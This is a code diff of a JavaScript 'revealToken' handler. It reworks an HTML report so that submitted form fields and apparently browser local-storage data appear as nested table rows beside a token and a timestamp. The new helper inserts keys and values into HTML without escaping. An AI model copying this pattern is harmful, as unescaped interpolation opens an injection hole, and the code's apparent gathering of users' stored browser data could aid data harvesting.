@@ -157,6 +157,19 @@ const revealToken = async (req, res) => {
       },
     ];
 
+    function renderObjectAsRows(obj) {
+      return Object.entries(obj)
+        .map(
+          ([key, value]) => `
+            <tr>
+              <td style="border: 1px solid #ccc; padding: 8px;"><strong>${key}</strong></td>
+              <td style="border: 1px solid #ccc; padding: 8px;">${value ?? 'N/A'}</td>
+            </tr>
+          `
+        )
+        .join("");
+    }
+
     const html = `
     <div style="font-family: Arial, sans-serif; padding: 20px; color: #333; background-color: #f9f9f9;">
       <div style="text-align: center; margin-bottom: 20px;">
@@ -172,18 +185,24 @@ const revealToken = async (req, res) => {
           <td style="border: 1px solid #ccc; padding: 8px;"><strong>Token</strong></td>
           <td style="border: 1px solid #ccc; padding: 8px;">${token.token}</td>
         </tr>
-        <tr>
-          <td style="border: 1px solid #ccc; padding: 8px;"><strong>Form</strong></td>
-          <td style="border: 1px solid #ccc; padding: 8px;">${
-            req.body.form
-          }</td>
-        </tr>
-        <tr>
-          <td style="border: 1px solid #ccc; padding: 8px;"><strong>LS Data</strong></td>
-          <td style="border: 1px solid #ccc; padding: 8px;">${
-            req.body.lsdata
-          }</td>
-        </tr>
+       <tr>
+        <td style="border: 1px solid #ccc; padding: 8px;"><strong>Form</strong></td>
+        <td style="border: 1px solid #ccc; padding: 8px;">
+          <table style="border-collapse: collapse; width: 100%;">
+            ${renderObjectAsRows(form)}
+          </table>
+        </td>
+      </tr>
+
+      <tr>
+        <td style="border: 1px solid #ccc; padding: 8px;"><strong>LS Data</strong></td>
+        <td style="border: 1px solid #ccc; padding: 8px;">
+          <table style="border-collapse: collapse; width: 100%;">
+            ${renderObjectAsRows(lsdata)}
+          </table>
+        </td>
+      </tr>
+
         <tr>
           <td style="border: 1px solid #ccc; padding: 8px;"><strong>Timestamp</strong></td>
           <td style="border: 1px solid #ccc; padding: 8px;">${timestamp}</td>
